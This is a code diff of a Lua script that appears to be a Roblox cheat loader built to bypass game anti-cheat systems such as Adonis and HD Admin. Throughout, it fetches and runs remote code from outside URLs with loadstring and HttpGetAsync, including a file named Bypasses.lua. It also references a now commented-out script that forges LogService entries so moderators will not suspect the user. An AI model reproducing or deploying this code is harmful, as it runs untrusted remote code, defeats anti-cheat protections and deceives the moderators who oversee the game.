@@ -98,11 +98,12 @@ local DB = {
 }
 
 for i, v in ipairs(DB) do
+    task.wait()
     for x, placeid in pairs(v.PlaceIDs) do
         if placeid == game.PlaceId then
             local Name = tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
             loadstring(game:HttpGetAsync((v.ScriptToRun),true))()
-            Notifier('Bypass founded for ' .. Name, true)
+            if Notifier then Notifier('Bypassed', true) end
         end
     end
 end
@@ -114,4 +115,4 @@ getgenv()["AntiCheatSettings"]["HD Admin"] = true;
 loadstring(game:HttpGetAsync("https://api.irisapp.ca/Scripts/Bypasses.lua"))() ]]
 
 -- This just replaces the log entries in LogService with believeable ones so moderators don't suspect you when looking at them.
-loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/Input50/Something/master/Misc/Logs.lua"),true))()
+-- loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/Input50/Something/master/Misc/Logs.lua"),true))() | Apparently adonis check log hijacking
